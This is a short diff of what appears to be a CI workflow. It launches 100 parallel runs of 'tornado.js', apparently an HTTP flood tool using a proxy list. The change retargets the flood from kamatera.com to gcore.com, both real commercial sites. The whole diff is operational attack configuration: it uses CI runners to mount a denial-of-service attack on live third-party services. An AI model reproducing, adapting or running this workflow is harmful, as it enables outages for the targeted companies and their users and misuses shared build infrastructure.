@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 45 node tornado.js GET https://www.kamatera.com/ 45 32 90 fres.txt --full --query 3
+            timeout 45 node tornado.js GET https://gcore.com/ 45 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
